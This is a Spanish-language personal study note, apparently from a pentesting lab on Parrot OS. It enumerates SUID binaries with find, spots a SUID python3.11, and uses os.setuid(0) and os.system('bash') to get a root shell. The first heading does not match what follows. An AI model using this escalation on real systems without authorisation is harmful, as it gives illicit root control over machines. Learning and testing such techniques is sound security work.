# Paralelizar comandos
┌─[root@parrot]─[/home/user]
└──╼ #which python | xargs ls -l
lrwxrwxrwx 1 root root 24 Apr  9  2023 /usr/bin/python -> /etc/alternatives/python

┌─[user@parrot]─[~]
└──╼ $find / -type f -perm -4000 2>/dev/null
- f = quiero buscar file (sino d directorios)
- privilegio 4000 = SUID a buscar
- 2>/dev/null = para que no salgan errores al no ser root

┌─[user@parrot]─[~]
└──╼ $find / -type f -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/ntfs-3g
/usr/bin/passwd
/usr/bin/pkexec
__/usr/bin/python3.11__ => *python es SUID*
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/vmware-user-suid-wrapper
/usr/lib/chromium/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/sbin/exim4
/usr/sbin/pppd
/usr/share/codium/chrome-sandbox
----

┌─[user@parrot]─[~]
└──╼ $ls -l /usr/bin/python3.11
-rwsr-xr-x 1 root root 6618304 Apr 28 14:11 /usr/bin/python3.11
┌─[user@parrot]─[~]
└──╼ $python3.11
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("whoami")
user
0
>>> os.setuid(0)
>>> os.system("whoami")
root
0
>>> 
# Al ser Python SUID puedo ejecutar setuid para ser ROOT directamente. !!!! PUEDE ESCALAR PRIVILEGIOS !!!
>>> os.system("bash")
┌─[root@parrot]─[~]
└──╼ #
# TAMBIEN PUEDO DECIRLE QUE ME DE DIRECTAMENTE UNA BASH !!!!